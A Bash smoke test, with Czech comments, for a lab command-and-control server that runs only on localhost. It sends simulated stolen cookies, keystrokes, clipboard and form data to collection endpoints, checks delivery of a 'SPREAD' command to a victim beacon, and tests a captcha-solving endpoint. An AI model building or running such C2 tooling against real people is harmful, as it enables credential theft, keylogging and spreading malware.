#!/usr/bin/env bash
# ---------------------------------------------------------------
# LAB ONLY — self-cleaning smoke test for c2.py (lab C2 server).
#
# Spustí C2 na PORT=8090 s pevným tokenem, otestuje:
#   1) ochranu tokenem (401 bez / 200 s tokenem)
#   2) sběrné endpointy /hello /k /p /f (očekává se 204)
#   3) beacon -> spread -> beacon smyčku (SPREAD příkaz se doručí)
#   4) OCR endpoint /solve proti PIL-generované lab captcha
# Na konci proces sám uklidí (trap).
#
# Použití:  bash lab/test_c2.sh
# Pozn.: běží jen lokálně (127.0.0.1). Nic neposílá mimo stroj.
# ---------------------------------------------------------------
set -u

PORT=8090
TOK="LABTOKEN"
BASE="http://127.0.0.1:${PORT}"
VID="labsmoke"
ROOT="$(cd "$(dirname "$0")/.." && pwd)"

PASS=0
FAIL=0
ok()   { PASS=$((PASS+1)); echo "  [ OK ] $1"; }
bad()  { FAIL=$((FAIL+1)); echo "  [FAIL] $1"; }

C2_PID=""
cleanup() {
    if [ -n "${C2_PID}" ] && kill -0 "${C2_PID}" 2>/dev/null; then
        kill "${C2_PID}" 2>/dev/null
        wait "${C2_PID}" 2>/dev/null
    fi
}
trap cleanup EXIT INT TERM

echo "[*] startuji C2 na ${BASE} (token=${TOK})"
cd "${ROOT}"
C2_PORT="${PORT}" C2_TOKEN="${TOK}" python3 c2.py >/tmp/c2_smoke.log 2>&1 &
C2_PID=$!

# čekáme na naslouchající port
for i in $(seq 1 40); do
    if curl -s -o /dev/null "${BASE}/beacon?vid=ping"; then break; fi
    sleep 0.25
done
if ! kill -0 "${C2_PID}" 2>/dev/null; then
    echo "[!] C2 nenaběhl, log:"; cat /tmp/c2_smoke.log; exit 1
fi
echo "[*] C2 běží (pid ${C2_PID})"
echo

echo "[test] 1) ochrana tokenem"
code_no=$(curl -s -o /dev/null -w '%{http_code}' "${BASE}/export")
code_ok=$(curl -s -o /dev/null -w '%{http_code}' "${BASE}/export?token=${TOK}")
[ "${code_no}" = "401" ] && ok "GET /export bez tokenu -> 401" || bad "GET /export bez tokenu -> ${code_no} (čekáno 401)"
[ "${code_ok}" = "200" ] && ok "GET /export s tokenem -> 200" || bad "GET /export s tokenem -> ${code_ok} (čekáno 200)"
echo

echo "[test] 2) sběrné endpointy (očekává se 204)"
for path in \
    "/hello?vid=${VID}&u=http://lab.local/index.php&co=TESTCOOKIE" \
    "/k?vid=${VID}&k=heslo123" \
    "/p?vid=${VID}&p=schranka" \
    "/f?vid=${VID}&d=jmeno%3Dmaxik"; do
    code=$(curl -s -o /dev/null -w '%{http_code}' "${BASE}${path}")
    [ "${code}" = "204" ] && ok "GET ${path} -> 204" || bad "GET ${path} -> ${code} (čekáno 204)"
done
echo

echo "[test] 3) beacon -> spread -> beacon"
curl -s -o /dev/null "${BASE}/beacon?vid=${VID}&u=http://lab.local/index.php"
curl -s -o /dev/null "${BASE}/spread?token=${TOK}"
cmd=$(curl -s "${BASE}/beacon?vid=${VID}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("cmd"))')
[ "${cmd}" = "SPREAD" ] && ok "SPREAD příkaz se doručil oběti (cmd=SPREAD)" || bad "beacon vrátil cmd='${cmd}' (čekáno SPREAD)"

# ověříme, že se příkaz po přečtení spotřeboval (další beacon = null)
cmd2=$(curl -s "${BASE}/beacon?vid=${VID}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("cmd"))')
[ "${cmd2}" = "None" ] || [ "${cmd2}" = "null" ] && ok "příkaz se po doručení spotřeboval (cmd=null)" || bad "druhý beacon vrátil cmd='${cmd2}' (čekáno null)"
echo

echo "[test] 4) OCR endpoint /solve"
if python3 -c "import PIL" 2>/dev/null; then
    info=$(python3 lab/gen_captcha.py)          # vypíše "  digits=NNNN sum=N"
    truth_sum=$(echo "${info}" | sed -n 's/.*sum=\([0-9]\+\).*/\1/p')
    b64=$(base64 -w0 /tmp/cap_lab.jpg)
    # base64 se musí URL-enkódovat (+ a / a = jinak rozbíjí query string)
    got=$(curl -s -G --data-urlencode "img=${b64}" "${BASE}/solve" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("sum"))')
    echo "      ground-truth sum=${truth_sum}  /solve sum=${got}"
    [ "${truth_sum}" = "${got}" ] && ok "/solve vrátil správný součet" || bad "/solve vrátil '${got}' (čekáno ${truth_sum})"
else
    echo "      [skip] PIL není nainstalován (pip install pillow)"
fi
echo

echo "[test] 5) úklid logu – export obsahuje události"
ev=$(curl -s "${BASE}/export?token=${TOK}" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get("events",[])))')
[ "${ev}" -ge 4 ] 2>/dev/null && ok "export obsahuje ${ev} událostí" || bad "export obsahuje '${ev}' událostí (čekáno >=4)"
echo

echo "==================== SOUHRN ===================="
echo "  PASS=${PASS}  FAIL=${FAIL}"
echo "================================================"
[ "${FAIL}" = "0" ] && exit 0 || exit 1
